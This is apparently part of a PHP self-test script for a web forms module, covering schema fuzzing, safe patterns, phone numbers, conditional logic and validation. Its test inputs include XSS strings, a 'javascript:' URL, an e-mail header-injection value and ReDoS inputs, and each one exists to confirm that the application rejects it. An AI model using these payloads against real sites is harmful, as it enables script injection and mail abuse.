<?php
/**
 * FORMS module checks (docs/FORMS.md). Run alone:   /c/xampp/php/php.exe bin/selftest-forms.php
 * or include it from bin/selftest.php (it shares check() and $fail when they exist).
 *
 * Part 1 (no web server needed): the definition schema and its fuzzing, the safe pattern presets, Uganda phone numbers, the condition truth table
 * (incl. hidden-required semantics), the validator for every field type, file rules (real PDF / PNG / DOCX-like bytes and hostile ones), the nine
 * templates, snapshots / search text / CSV export (formula safety), e-mail placeholders and header-injection safety, statuses and availability,
 * optimistic locking, the transactional "last place" race (parallel PHP processes), one submission per e-mail, retention, statistics, spam traps,
 * abilities, the seeded editor-role upgrade and the shortcode.
 * Part 2 (needs the site at http://localhost/<folder>/): the real HTTP flow for visitors (page, CSRF, honeypot, validation, upload, thank-you, closed /
 * full / draft states, noindex) and for admins (builder API, conflict, publish, inbox, detail, export, file download, bulk, delete) and the ability checks
 * with a restricted role. That part skips itself when the site does not answer.
 *
 * Everything it creates is removed again: forms "zz-selftest-forms ...", their submissions, files, mail files, rate-limit rows, the throw-away users and roles.
 */
declare(strict_types=1);

if (!function_exists('check')) {
    if (PHP_SAPI !== 'cli') {
        exit('CLI only.');
    }
    require dirname(__DIR__) . '/app/bootstrap.php';
    if (\App\Core\Config::get('app.env') !== 'local') {
        exit("Refusing to run outside APP_ENV=local.\n");
    }
    $fail = 0;
    function check(string $name, bool $ok, string $extra = ''): void
    {
        global $fail;
        echo ($ok ? '  ok   ' : '  FAIL ') . $name . ($ok || $extra === '' ? '' : "  -> {$extra}") . PHP_EOL;
        if (!$ok) {
            $fail++;
        }
    }
    $standalone = true;
}

use App\Core\Config;
use App\Core\CsvExport;
use App\Core\Database;
use App\Core\Roles;
use App\Core\UploadException;
use App\Models\Form;
use App\Models\FormSubmission;
use App\Services\Forms\ConditionEvaluator;
use App\Services\Forms\FormDefinition;
use App\Services\Forms\FormExport;
use App\Services\Forms\FormFileStore;
use App\Services\Forms\FormMailer;
use App\Services\Forms\FormRetention;
use App\Services\Forms\FormService;
use App\Services\Forms\FormSettings;
use App\Services\Forms\FormSpam;
use App\Services\Forms\FormShortcode;
use App\Services\Forms\FormStats;
use App\Services\Forms\FormTemplates;
use App\Services\Forms\FormText;
use App\Services\Forms\FormValidator;
use App\Services\Forms\SubmissionService;

const ZZ_FORMS = 'zz-selftest-forms';

$zzCleanup = static function (): void {
    try {
        $ids = array_map('intval', array_column(Database::all('SELECT id FROM forms WHERE title LIKE ? OR title LIKE ?', [ZZ_FORMS . '%', 'Copy of ' . ZZ_FORMS . '%']), 'id'));
        foreach ($ids as $id) {
            FormService::delete($id);
            Database::execute("DELETE FROM audit_log WHERE entity_type = 'form' AND entity_id = ?", [$id]);
        }
        Database::execute("DELETE FROM jobs WHERE slug LIKE 'zz-selftest-forms-%'");
        Database::execute("DELETE FROM audit_log WHERE user_name LIKE '%zz-forms-%@example.test%'");
        Database::execute("DELETE FROM login_attempts WHERE email LIKE 'zz-forms-%@example.test'");
        Database::execute("DELETE FROM users WHERE email LIKE 'zz-forms-%@example.test'");
        Database::execute("DELETE FROM roles WHERE slug LIKE 'zz-forms-%'");
        Database::execute("DELETE FROM rate_limits WHERE 1 = 0");
        Roles::flush();
    } catch (\Throwable) {
    }
};
$zzCleanup();
$zzMailsBefore = glob(STORAGE_PATH . '/mail/*.eml') ?: [];
register_shutdown_function(static function () use ($zzMailsBefore): void {
    foreach (array_diff(glob(STORAGE_PATH . '/mail/*.eml') ?: [], $zzMailsBefore) as $f) {       // mails this run wrote (test forms only)
        $t = (string) @file_get_contents($f);
        if (str_contains($t, 'zz-selftest-forms') || str_contains($t, '@example.org') || str_contains($t, '@example.test')) {
            @unlink($f);
        }
    }
});
register_shutdown_function($zzCleanup);
$zzTmp = [];
register_shutdown_function(static function () use (&$zzTmp): void {
    foreach ($zzTmp as $f) {
        @unlink($f);
    }
});

// ================================================================================================================================ helpers
$mkTmp = static function (string $bytes, string $ext = 'bin') use (&$zzTmp): string {
    $p = tempnam(sys_get_temp_dir(), 'zzf') ?: throw new \RuntimeException('tmp');
    file_put_contents($p, $bytes);
    $zzTmp[] = $p;
    return $p;
};
$upload = static function (string $path, string $name) {
    return ['name' => $name, 'type' => 'application/octet-stream', 'tmp_name' => $path, 'error' => UPLOAD_ERR_OK, 'size' => (int) filesize($path)];
};
$pdfBytes = static function (string $label = 'Hello'): string {
    $objs = ['<< /Type /Catalog /Pages 2 0 R >>', '<< /Type /Pages /Kids [4 0 R] /Count 1 >>', '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>'];
    $text = 'BT /F1 24 Tf 72 700 Td (' . $label . ') Tj ET';
    $objs[] = '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 5 0 R /Resources << /Font << /F1 3 0 R >> >> >>';
    $objs[] = '<< /Length ' . strlen($text) . " >>\nstream\n" . $text . "\nendstream";
    $out = "%PDF-1.4\n";
    $offs = [];
    foreach ($objs as $i => $o) {
        $offs[$i + 1] = strlen($out);
        $out .= ($i + 1) . " 0 obj\n" . $o . "\nendobj\n";
    }
    $xref = strlen($out);
    $out .= "xref\n0 " . (count($objs) + 1) . "\n0000000000 65535 f \n";
    foreach ($offs as $o) {
        $out .= sprintf("%010d 00000 n \n", $o);
    }
    return $out . "trailer\n<< /Size " . (count($objs) + 1) . " /Root 1 0 R >>\nstartxref\n" . $xref . "\n%%EOF\n";
};
$pngBytes = base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==');
/** A real (stored, uncompressed) ZIP with one part: enough for the "Office package" check (central directory lists word/document.xml). */
$zipBytes = static function (string $part, string $content): string {
    $crc = crc32($content);
    $local = "PK\x03\x04" . pack('v', 20) . pack('v', 0) . pack('v', 0) . pack('v', 0) . pack('v', 0x21) . pack('V', $crc) . pack('V', strlen($content)) . pack('V', strlen($content)) . pack('v', strlen($part)) . pack('v', 0) . $part . $content;
    $central = "PK\x01\x02" . pack('v', 20) . pack('v', 20) . pack('v', 0) . pack('v', 0) . pack('v', 0) . pack('v', 0x21) . pack('V', $crc) . pack('V', strlen($content)) . pack('V', strlen($content)) . pack('v', strlen($part)) . pack('v', 0) . pack('v', 0) . pack('v', 0) . pack('v', 0) . pack('V', 0) . pack('V', 0) . $part;
    $end = "PK\x05\x06" . pack('v', 0) . pack('v', 0) . pack('v', 1) . pack('v', 1) . pack('V', strlen($central)) . pack('V', strlen($local)) . pack('v', 0);
    return $local . $central . $end;
};
/** A ZIP of several parts (stored; the names listed in $deflate are deflated): name => content. */
$zipParts = static function (array $parts, array $deflate = []): string {
    $local = '';
    $central = '';
    $n = 0;
    foreach ($parts as $name => $content) {
        $name = (string) $name;
        $crc = crc32($content);
        $method = in_array($name, $deflate, true) ? 8 : 0;
        $data = $method === 8 ? (string) gzdeflate($content) : $content;
        $off = strlen($local);
        $local .= "PK\x03\x04" . pack('v', 20) . pack('v', 0) . pack('v', $method) . pack('v', 0) . pack('v', 0x21) . pack('V', $crc) . pack('V', strlen($data)) . pack('V', strlen($content)) . pack('v', strlen($name)) . pack('v', 0) . $name . $data;
        $central .= "PK\x01\x02" . pack('v', 20) . pack('v', 20) . pack('v', 0) . pack('v', $method) . pack('v', 0) . pack('v', 0x21) . pack('V', $crc) . pack('V', strlen($data)) . pack('V', strlen($content)) . pack('v', strlen($name)) . pack('v', 0) . pack('v', 0) . pack('v', 0) . pack('v', 0) . pack('V', 0) . pack('V', $off) . $name;
        $n++;
    }
    return $local . $central . "PK\x05\x06" . pack('v', 0) . pack('v', 0) . pack('v', $n) . pack('v', $n) . pack('V', strlen($central)) . pack('V', strlen($local)) . pack('v', 0);
};
/** Build a one-page definition from [type, key, label, extra] rows. @return array<string,mixed> normalised */
$mkDef = static function (array $rows, ?array $pages = null): array {
    $fields = [];
    foreach ($rows as $r) {
        $fields[] = ['id' => 'f' . $r[1], 'key' => $r[1], 'type' => $r[0], 'label' => $r[2]] + ($r[3] ?? []);
    }
    $res = FormDefinition::normalise(['pages' => $pages ?? [['id' => 'pgone', 'title' => 'One', 'fields' => $fields]]]);
    if (!$res['ok']) {
        throw new \RuntimeException('mkDef: ' . json_encode($res['errors']));
    }
    return $res['definition'];
};
$val = static fn(array $def, array $in, array $files = [], array $opts = []): array => FormValidator::validate($def, $in, $files, $opts);

foreach (['zed@example.org', 'ratelimit@example.org', 'zzplus@example.org'] as $zzAddr) {
    \App\Core\RateLimit::clear('forms:confirm:addr:' . hash('sha256', $zzAddr));
}
foreach (['198.51.100.9', '198.51.100.77', '198.51.100.88'] as $zzIp) {
    \App\Core\RateLimit::clear('forms:ip:' . $zzIp);
}
echo "Forms: definition schema\n";

// ------------------------------------------------------------------------------------------------------------------------------------ definition
$blank = FormDefinition::blank();
check('blank definition: one page, no fields, version 1', count($blank['pages']) === 1 && $blank['pages'][0]['fields'] === [] && $blank['version'] === 1);
$n = FormDefinition::normalise($blank);
check('blank definition is valid and stays identical after normalise()', $n['ok'] && $n['definition']['pages'][0]['id'] === $blank['pages'][0]['id'] && $n['definition']['pages'][0]['fields'] === []);

$messy = FormDefinition::normalise(['pages' => [['id' => 'BAD ID', 'title' => "<b>Page</b> <script>alert(1)</script>\n one", 'fields' => [
    ['type' => 'text', 'label' => '<img src=x onerror=alert(1)>Name', 'key' => 'Full Name!', 'required' => 'true', 'width' => 'huge', 'rogue' => 'x', 'validation' => ['pattern' => '(a+)+$', 'min_length' => '5', 'max_length' => 999999]],
    ['id' => 'dup1x', 'type' => 'email', 'label' => 'Email', 'key' => 'name'],
    ['id' => 'dup1x', 'type' => 'email', 'label' => 'Email 2', 'key' => 'name'],
    ['type' => 'select', 'label' => 'Choice', 'options' => ['A', ['label' => 'B', 'value' => 'a'], ['value' => 'x y', 'label' => 'C'], '', ['label' => 'A']], 'default' => 'nope'],
]]]]);
$mf = $messy['definition']['pages'][0]['fields'] ?? [];
check('fuzz: hostile page title / labels lose all tags and angle brackets', $messy['ok'] && !preg_match('/[<>]/', json_encode($messy['definition'])) && $messy['definition']['pages'][0]['title'] === 'Page alert(1) one', json_encode($messy['definition']['pages'][0]['title'] ?? ''));
check('fuzz: invalid ids are replaced, duplicates are made unique, ids match the id pattern', preg_match(FormDefinition::ID_PATTERN, $messy['definition']['pages'][0]['id']) === 1 && count(array_unique(array_column($mf, 'id'))) === 4 && array_reduce($mf, static fn($c, $f) => $c && preg_match(FormDefinition::ID_PATTERN, $f['id']) === 1, true));
check('fuzz: keys are unique, lower-case snake and never reserved', count(array_unique(array_column($mf, 'key'))) === 4 && preg_match(FormDefinition::KEY_PATTERN, $mf[0]['key']) === 1, json_encode(array_column($mf, 'key')));
check('fuzz: unknown properties are dropped, bad width falls back to full, regex-like pattern is not accepted', !isset($mf[0]['rogue']) && $mf[0]['width'] === 'full' && $mf[0]['validation']['pattern'] === '');
check('fuzz: numeric limits are clamped (max_length 999999 -> cap 8000), strings become ints', $mf[0]['validation']['max_length'] === 8000 && $mf[0]['validation']['min_length'] === 5);
check('fuzz: required as the string "true" is true', $mf[0]['required'] === true);
$opts = $mf[3]['options'];
check('fuzz: options keep order, empty labels are dropped, values are unique and URL-safe', array_column($opts, 'label') === ['A', 'B', 'C', 'A'] && count(array_unique(array_column($opts, 'value'))) === 4 && array_reduce($opts, static fn($c, $o) => $c && preg_match('/^[A-Za-z0-9_.\-]{1,60}$/', $o['value']) === 1, true), json_encode($opts));
check('fuzz: a default that is not an option is cleared', $mf[3]['default'] === '');
check('warnings report the repairs', count($messy['warnings']) >= 1, json_encode($messy['warnings']));

$bad = FormDefinition::normalise(['pages' => [['fields' => [['type' => 'script', 'label' => 'x']]]]]);
check('unknown field type is a hard error', !$bad['ok'] && $bad['definition'] === null && str_contains(json_encode($bad['errors']), 'type'));
$bad = FormDefinition::normalise(['pages' => [['fields' => [['type' => 'text', 'label' => 'x', 'logic' => ['rules' => [['field' => 'fabc', 'op' => 'matches', 'value' => 'x']]]]]]]]);
check('unknown condition operator is a hard error', !$bad['ok']);
$bad = FormDefinition::normalise(['pages' => [['fields' => [['type' => 'text', 'label' => 'x', 'logic' => ['rules' => [['field' => 'fabc', 'op' => 'equals'], ['field' => 'fabd', 'op' => 'equals'], ['field' => 'fabe', 'op' => 'equals']]]]]]]]);
check('more than two conditions is a hard error', !$bad['ok']);
check('not an object / not JSON / no pages are rejected', !FormDefinition::normalise('nope')['ok'] && !FormDefinition::normalise(['x' => 1])['ok'] && !FormDefinition::normalise(42)['ok'] && FormDefinition::normalise('{"pages":[]}')['ok']);
$tooMany = ['pages' => [['fields' => array_fill(0, 151, ['type' => 'text', 'label' => 'q'])]]];
check('caps: 151 fields refused (limit 150)', !FormDefinition::normalise($tooMany)['ok'] && FormDefinition::normalise(['pages' => [['fields' => array_fill(0, 150, ['type' => 'text', 'label' => 'q'])]]])['ok']);
check('caps: 13 pages refused (limit 12)', !FormDefinition::normalise(['pages' => array_fill(0, 13, ['fields' => []])])['ok'] && FormDefinition::normalise(['pages' => array_fill(0, 12, ['fields' => []])])['ok']);
$manyOpts = array_map(static fn($i) => 'Option ' . $i, range(1, 201));
check('caps: 201 options refused (limit 200), 200 accepted', !FormDefinition::normalise(['pages' => [['fields' => [['type' => 'select', 'label' => 's', 'options' => $manyOpts]]]]])['ok'] && FormDefinition::normalise(['pages' => [['fields' => [['type' => 'select', 'label' => 's', 'options' => array_slice($manyOpts, 0, 200)]]]]])['ok']);
$long = FormDefinition::normalise(['pages' => [['title' => str_repeat('é', 500), 'fields' => [['type' => 'text', 'label' => str_repeat('x', 900), 'help' => str_repeat('h', 5000), 'placeholder' => str_repeat('p', 900)]]]]])['definition'];
check('caps: label 200, help 600, placeholder 160, page title 200 characters (multibyte safe)', mb_strlen($long['pages'][0]['fields'][0]['label']) === 200 && mb_strlen($long['pages'][0]['fields'][0]['help']) === 600 && mb_strlen($long['pages'][0]['fields'][0]['placeholder']) === 160 && mb_strlen($long['pages'][0]['title']) === 200);
check('size cap: a definition over 512 KB is refused', !FormDefinition::normalise('{"pages":[],"x":"' . str_repeat('a', 600000) . '"}')['ok']);
$paragraph = FormDefinition::normalise(['pages' => [['fields' => [['type' => 'paragraph', 'text' => "Line one\r\n\r\n\r\n\r\nLine <b>two</b>"], ['type' => 'heading', 'label' => 'H', 'required' => true, 'width' => 'half'], ['type' => 'divider']]]]])['definition']['pages'][0]['fields'];
check('layout fields: no key, never required, full width, paragraph text keeps paragraphs but loses tags', $paragraph[0]['key'] === '' && $paragraph[1]['required'] === false && $paragraph[1]['width'] === 'full' && $paragraph[0]['text'] === "Line one\n\nLine two", json_encode($paragraph[0]['text']));
$f1 = FormDefinition::normalise(['pages' => [['fields' => [['type' => 'file', 'label' => 'F', 'file' => ['types' => ['PDF', 'exe', 'jpeg', 'svg', 'docx'], 'max_mb' => 999, 'max_files' => 99]]]]]])['definition']['pages'][0]['fields'][0]['file'];
check('file rules: only the safe list (jpeg -> jpg), size and count are capped', $f1['types'] === ['pdf', 'jpg', 'docx'] && $f1['max_mb'] <= 25 && $f1['max_files'] === 5, json_encode($f1));
$f2 = FormDefinition::normalise(['pages' => [['fields' => [['type' => 'file', 'label' => 'F', 'file' => ['types' => ['exe', 'php']]]]]]])['definition']['pages'][0]['fields'][0]['file'];
check('file rules: nothing valid left gives PDF', $f2['types'] === ['pdf']);
check('JSON round trip: decode(encode(def)) equals def', FormDefinition::decode(FormDefinition::encode($messy['definition'])) === $messy['definition']);
check('decode(garbage) gives a blank definition, never throws', FormDefinition::decode('{{{')['pages'][0]['fields'] === [] && FormDefinition::decode(null)['version'] === 1);

echo "Forms: safe patterns and phone numbers\n";
check('patterns: only NAMED presets exist (8), none takes user input', count(FormDefinition::PATTERNS) === 8 && array_keys(FormDefinition::PATTERNS) === ['letters', 'digits', 'letters_digits', 'ug_phone', 'url', 'nin', 'year', 'no_links']);
check('pattern letters: names with accents, hyphen and apostrophe pass; digits and symbols fail', FormDefinition::matchPattern('letters', "Anyango O'Neil-Ouma") && FormDefinition::matchPattern('letters', 'Zoë Müller') && !FormDefinition::matchPattern('letters', 'Jane2') && !FormDefinition::matchPattern('letters', '<b>'));
check('pattern digits / letters_digits / year', FormDefinition::matchPattern('digits', '0123') && !FormDefinition::matchPattern('digits', '12a') && FormDefinition::matchPattern('letters_digits', 'Room 12-B') && !FormDefinition::matchPattern('letters_digits', 'a_b') && FormDefinition::matchPattern('year', '2024') && !FormDefinition::matchPattern('year', '2124') && !FormDefinition::matchPattern('year', '924'));
check('pattern ug_phone: 0700 123456, +256 700 123456, 256700123456, (0414) 123456 pass; 12345 and +254 700 123456 fail', FormDefinition::matchPattern('ug_phone', '0700 123456') && FormDefinition::matchPattern('ug_phone', '+256 700 123456') && FormDefinition::matchPattern('ug_phone', '256700123456') && FormDefinition::matchPattern('ug_phone', '(0414) 123456') && !FormDefinition::matchPattern('ug_phone', '12345') && !FormDefinition::matchPattern('ug_phone', '+254 700 123456'));
check('pattern url: https and http pass; javascript:, ftp:, spaces and bare words fail', FormDefinition::matchPattern('url', 'https://www.linkedin.com/in/jane') && FormDefinition::matchPattern('url', 'http://example.org/a?b=1#c') && !FormDefinition::matchPattern('url', 'javascript:alert(1)') && !FormDefinition::matchPattern('url', 'ftp://example.org') && !FormDefinition::matchPattern('url', 'https://exa mple.org') && !FormDefinition::matchPattern('url', 'example'));
check('pattern nin: CM12345678ABCD (also lower case / spaces) passes; short, wrong prefix fail', FormDefinition::matchPattern('nin', 'CM12345678ABCD') && FormDefinition::matchPattern('nin', 'cf 12345678 abcd') && !FormDefinition::matchPattern('nin', 'CM1234567ABCD') && !FormDefinition::matchPattern('nin', 'XX12345678ABCD'));
check('pattern no_links: plain text passes; http://, www. fail', FormDefinition::matchPattern('no_links', 'Hello there') && !FormDefinition::matchPattern('no_links', 'visit http://spam.test') && !FormDefinition::matchPattern('no_links', 'see www.spam.test'));
$t0 = microtime(true);
FormDefinition::matchPattern('letters', str_repeat('a', 20000) . '1');
FormDefinition::matchPattern('url', 'https://' . str_repeat('a.', 20000));
FormDefinition::matchPattern('no_links', str_repeat('x', 100000));
check('ReDoS: the presets stay linear (3 hostile 20-100 KB inputs in < 1 s)', (microtime(true) - $t0) < 1.0, (string) round(microtime(true) - $t0, 3));
foreach ([['0700123456', '+256700123456'], ['0700 123 456', '+256700123456'], ['+256 700-123-456', '+256700123456'], ['256700123456', '+256700123456'], ['00256700123456', '+256700123456'], ['(0414) 123456', '+256414123456'], ['+254 712 345678', '+254712345678'], ['+1 (415) 555-2671', '+14155552671']] as [$in, $out]) {
    check('phone "' . $in . '" -> ' . $out, FormDefinition::normalisePhone($in) === $out, (string) FormDefinition::normalisePhone($in));
}
foreach (['700123456', '12345', 'abc', '+0700123456', '', '0700 123 45', str_repeat('1', 30), '07<script>'] as $in) {
    check('phone "' . substr($in, 0, 20) . '" is refused', FormDefinition::normalisePhone($in) === null);
}

// ------------------------------------------------------------------------------------------------------------------------------------ conditions
echo "Forms: conditional logic (PHP side of the shared truth table)\n";
$truth = require __DIR__ . '/dev/forms-truth.php';
$bad = [];
foreach ($truth as [$op, $v, $rv, $want]) {
    if (ConditionEvaluator::ruleMatches(['op' => $op, 'value' => $rv], $v) !== $want) {
        $bad[] = $op . '(' . json_encode($v) . ',' . json_encode($rv) . ')';
    }
}
check('truth table: ' . count($truth) . ' operator cases', $bad === [], implode(' ', $bad));
$lv = static fn(array $map): callable => static fn(string $id) => $map[$id] ?? null;
check('passes(): no logic = visible; all/any with one or two rules', ConditionEvaluator::passes(null, $lv([])) && ConditionEvaluator::passes(['match' => 'all', 'rules' => []], $lv([]))
    && ConditionEvaluator::passes(['match' => 'all', 'rules' => [['field' => 'a', 'op' => 'equals', 'value' => 'x'], ['field' => 'b', 'op' => 'filled']]], $lv(['a' => 'x', 'b' => '1']))
    && !ConditionEvaluator::passes(['match' => 'all', 'rules' => [['field' => 'a', 'op' => 'equals', 'value' => 'x'], ['field' => 'b', 'op' => 'filled']]], $lv(['a' => 'x']))
    && ConditionEvaluator::passes(['match' => 'any', 'rules' => [['field' => 'a', 'op' => 'equals', 'value' => 'x'], ['field' => 'b', 'op' => 'filled']]], $lv(['b' => '1']))
    && !ConditionEvaluator::passes(['match' => 'any', 'rules' => [['field' => 'a', 'op' => 'equals', 'value' => 'x'], ['field' => 'b', 'op' => 'filled']]], $lv([])));

$cd = $mkDef([['radio', 'attend', 'Attend?', ['options' => ['Yes', 'No']]], ['number', 'guests', 'Guests', ['logic' => ['match' => 'all', 'rules' => [['field' => 'fattend', 'op' => 'equals', 'value' => 'yes']]], 'required' => true]],
    ['text', 'why', 'Why', ['logic' => ['match' => 'all', 'rules' => [['field' => 'fguests', 'op' => 'gt', 'value' => '3']]]]]]);
$r = ConditionEvaluator::resolve($cd, ['fattend' => 'yes', 'fguests' => '5', 'fwhy' => 'x']);
check('resolve: visible chain (attend=yes -> guests -> why)', $r['fields'] === ['fattend' => true, 'fguests' => true, 'fwhy' => true]);
$r = ConditionEvaluator::resolve($cd, ['fattend' => 'no', 'fguests' => '5', 'fwhy' => 'x']);
check('resolve: hiding guests also hides why (a hidden field is EMPTY for later rules) and drops the values', $r['fields'] === ['fattend' => true, 'fguests' => false, 'fwhy' => false] && $r['values']['fguests'] === null && $r['values']['fwhy'] === null);
$r = ConditionEvaluator::resolve($cd, []);
check('resolve: nothing answered hides both dependants', $r['fields']['fguests'] === false && $r['fields']['fwhy'] === false);
$cycle = $mkDef([['text', 'a', 'A', ['logic' => ['match' => 'all', 'rules' => [['field' => 'fb', 'op' => 'filled']]]]], ['text', 'b', 'B', ['logic' => ['match' => 'all', 'rules' => [['field' => 'fa', 'op' => 'filled']]]]]]);
$r1 = ConditionEvaluator::resolve($cycle, ['fa' => 'x', 'fb' => 'y']);
$r2 = ConditionEvaluator::resolve($cycle, ['fa' => 'x', 'fb' => 'y']);
check('resolve: a dependency cycle terminates and is deterministic', $r1 === $r2 && is_bool($r1['fields']['fa']));
$pg = $mkDef([], [['id' => 'pgone', 'title' => 'One', 'fields' => [['id' => 'fkind', 'key' => 'kind', 'type' => 'radio', 'label' => 'Kind', 'options' => ['A', 'B']]]],
    ['id' => 'pgtwo', 'title' => 'Two', 'logic' => ['match' => 'all', 'rules' => [['field' => 'fkind', 'op' => 'equals', 'value' => 'a']]], 'fields' => [['id' => 'fextra', 'key' => 'extra', 'type' => 'text', 'label' => 'Extra', 'required' => true]]]]);
$r = ConditionEvaluator::resolve($pg, ['fkind' => 'b']);
check('resolve: page logic hides the page and every field on it', $r['pages'] === ['pgone' => true, 'pgtwo' => false] && $r['fields']['fextra'] === false);

echo "Forms: validator by field type\n";
// ------------------------------------------------------------------------------------------------------------------------------------ validator
$vd = $mkDef([
    ['text', 'name', 'Name', ['required' => true, 'validation' => ['min_length' => 2, 'max_length' => 20, 'pattern' => 'letters']]],
    ['email', 'mail', 'Email', ['required' => true]],
    ['phone', 'tel', 'Phone', ['required' => false]],
    ['number', 'age', 'Age', ['validation' => ['min' => 18, 'max' => 99]]],
    ['date', 'dob', 'DOB', ['validation' => ['min' => '1990-01-01', 'max' => 'today']]],
    ['time', 'at', 'Time', ['validation' => ['min' => '08:00', 'max' => '17:30']]],
    ['select', 'city', 'City', ['options' => ['Gulu', 'Kampala'], 'allow_other' => true]],
    ['radio', 'size', 'Size', ['options' => ['S', 'M'], 'required' => true]],
    ['checkboxes', 'topics', 'Topics', ['options' => ['One', 'Two', 'Three'], 'allow_other' => true, 'validation' => ['min' => 1, 'max' => 2]]],
    ['yes_no', 'yn', 'YesNo'],
    ['rating', 'stars', 'Stars'],
    ['consent', 'ok', 'I agree', ['required' => true]],
]);
$good = ['fname' => "  Jane   O'Neil ", 'fmail' => 'Jane@Example.ORG ', 'ftel' => '0700 111 222', 'fage' => '30', 'fdob' => '1995-05-20', 'fat' => '09:15', 'fcity' => 'gulu', 'fsize' => 'm', 'ftopics' => ['one', 'two'], 'fyn' => 'yes', 'fstars' => '4', 'fok' => '1'];
$in = [];
foreach ($good as $k => $v) {
    $in['f_' . $k] = $v;
}
$r = $val($vd, $in);
check('valid submission: ok, values cleaned (spaces collapsed, e-mail lower-case, phone +E.164), consent time set', $r['ok'] && $r['values']['fname'] === "Jane O'Neil" && $r['values']['fmail'] === 'jane@example.org' && $r['values']['ftel'] === '+256700111222' && $r['values']['fcity'] === 'gulu' && $r['values']['ftopics'] === ['one', 'two'] && $r['consent_at'] !== null, json_encode($r['errors']));
$cases = [
    'required text empty'            => [['f_fname' => ''], 'fname', 'required'],
    'text too short'                 => [['f_fname' => 'J'], 'fname', 'at least 2'],
    'text too long'                  => [['f_fname' => str_repeat('a', 21)], 'fname', 'at most 20'],
    'text breaks the letters preset' => [['f_fname' => 'Jane99'], 'fname', 'letters'],
    'bad e-mail'                     => [['f_fmail' => 'jane@'], 'fmail', 'e-mail'],
    'e-mail with header injection'   => [['f_fmail' => "a@b.org\r\nBcc: x@y.org"], 'fmail', 'e-mail'],
    'bad phone'                      => [['f_ftel' => '12345'], 'ftel', 'phone'],
    'age not a number'               => [['f_fage' => 'abc'], 'fage', 'number'],
    'age below min'                  => [['f_fage' => '17'], 'fage', '18 or more'],
    'age above max'                  => [['f_fage' => '100'], 'fage', '99 or less'],
    'date impossible'                => [['f_fdob' => '2025-02-30'], 'fdob', 'valid date'],
    'date too early'                 => [['f_fdob' => '1980-01-01'], 'fdob', 'on or after'],
    'date in the future (max today)' => [['f_fdob' => '2099-01-01'], 'fdob', 'on or before'],
    'time before min'                => [['f_fat' => '07:59'], 'fat', 'at or after'],
    'time after max'                 => [['f_fat' => '17:31'], 'fat', 'at or before'],
    'time invalid'                   => [['f_fat' => '25:00'], 'fat', 'valid time'],
    'select value not an option'     => [['f_fcity' => 'Mars'], 'fcity', 'listed options'],
    'radio value not an option'      => [['f_fsize' => 'XL'], 'fsize', 'listed options'],
    'radio required empty'           => [['f_fsize' => ''], 'fsize', 'required'],
    'other chosen without text'      => [['f_fcity' => FormDefinition::OTHER], 'fcity', 'Other'],
    'checkbox not an option'         => [['f_ftopics' => ['one', 'zzz']], 'ftopics', 'listed options'],
    'too many checkboxes'            => [['f_ftopics' => ['one', 'two', 'three']], 'ftopics', 'at most 2'],
    'yes/no invalid'                 => [['f_fyn' => 'maybe'], 'fyn', 'yes or no'],
    'rating 6'                       => [['f_fstars' => '6'], 'fstars', 'rating'],
    'rating 0'                       => [['f_fstars' => '0'], 'fstars', 'rating'],
    'consent unticked'               => [['f_fok' => ''], 'fok', 'tick'],
    'array sent for a text field'    => [['f_fname' => ['a', 'b']], 'fname', 'required'],
];
foreach ($cases as $label => [$patch, $fid, $needle]) {
    $r = $val($vd, array_replace($in, $patch));
    check('invalid: ' . $label, !$r['ok'] && isset($r['errors'][$fid]) && stripos($r['errors'][$fid], $needle) !== false, json_encode($r['errors']));
}
$r = $val($vd, array_replace($in, ['f_fcity' => FormDefinition::OTHER, 'f_fcity_other' => '  Arua  ', 'f_ftopics' => ['one', FormDefinition::OTHER], 'f_ftopics_other' => 'Misc']));
check('"Other: please specify" for select and checkboxes: free text kept per field', $r['ok'] && $r['others'] === ['fcity' => 'Arua', 'ftopics' => 'Misc'] && $r['values']['ftopics'] === ['one', '__other'], json_encode($r['errors']));
$r = $val($vd, array_replace($in, ['f_ftopics' => ['one', 'one', 'two']]));
check('checkboxes: duplicates are removed', $r['ok'] && $r['values']['ftopics'] === ['one', 'two']);
$r = $val($vd, array_replace($in, ['f_ftel' => '', 'f_fage' => '', 'f_fdob' => '', 'f_fat' => '', 'f_fcity' => '', 'f_ftopics' => [], 'f_fyn' => '', 'f_fstars' => '']));
check('optional fields may stay empty (no validation runs on them)', $r['ok'], json_encode($r['errors']));
$r = $val($vd, array_replace($in, ['f_fname' => "Jane\x00\x07 <b>X</b>"]));
check('control characters are removed, markup is kept as data (escaped on output)', !$r['ok'] ? true : !str_contains($r['values']['fname'], "\x00"), json_encode($r['errors']));
$r = $val($vd, ['f_fname' => '<script>alert(1)</script>', 'f_fmail' => 'x']);
check('errors never echo the hostile input back', !str_contains(json_encode($r['errors']), '<script>') && !str_contains(json_encode($r['errors']), 'alert'));
$hid = $mkDef([['radio', 'k', 'K', ['options' => ['A', 'B']]], ['text', 'must', 'Must', ['required' => true, 'logic' => ['match' => 'all', 'rules' => [['field' => 'fk', 'op' => 'equals', 'value' => 'a']]], 'validation' => ['pattern' => 'digits']]]]);
$r = $val($hid, ['f_fk' => 'b', 'f_fmust' => 'not digits <hacked>']);
check('hidden-required semantics: a hidden required field is not validated and its posted value is DROPPED', $r['ok'] && !array_key_exists('fmust', $r['values']) && $r['visible']['fmust'] === false);
$r = $val($hid, ['f_fk' => 'a', 'f_fmust' => '']);
check('the same field visible and empty gives the required error', !$r['ok'] && isset($r['errors']['fmust']));
$r = $val($hid, ['f_fk' => 'a', 'f_fmust' => 'abc']);
check('the same field visible with a wrong format gives the pattern error', !$r['ok'] && stripos($r['errors']['fmust'], 'digits') !== false);
$hp = $mkDef([['radio', 'k', 'K', ['options' => ['A', 'B']]]], [['id' => 'pgone', 'title' => 'One', 'fields' => [['id' => 'fk', 'key' => 'k', 'type' => 'radio', 'label' => 'K', 'options' => ['A', 'B']]]], ['id' => 'pgtwo', 'title' => 'Two', 'logic' => ['match' => 'all', 'rules' => [['field' => 'fk', 'op' => 'equals', 'value' => 'a']]], 'fields' => [['id' => 'fx', 'key' => 'x', 'type' => 'text', 'label' => 'X', 'required' => true]]]]);
$r = $val($hp, ['f_fk' => 'b']);
check('a hidden PAGE hides its required fields too', $r['ok'] && $r['pages_visible']['pgtwo'] === false);
$r = $val($hp, ['f_fk' => 'a']);
